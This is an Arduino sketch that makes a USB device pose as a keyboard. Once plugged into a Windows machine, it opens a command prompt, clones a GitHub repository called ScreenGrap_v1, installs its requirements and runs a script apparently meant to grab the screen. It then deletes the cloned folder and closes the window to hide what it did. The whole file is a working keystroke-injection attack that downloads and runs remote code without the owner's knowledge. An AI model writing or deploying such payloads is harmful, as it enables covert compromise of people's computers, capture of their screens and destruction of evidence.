#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(4000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(20);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.print("cmd.exe");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("cd Desktop");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("git clone https://github.com/karolsznajder/ScreenGrap_v1.git");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.print("cd ScreenGrap_v1");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("pip install -r requirements.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);

  Keyboard.print("python screengrab.py");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(13000);

  Keyboard.print("cd ..");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("rmdir /s /q ScreenGrap_v1");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {
}
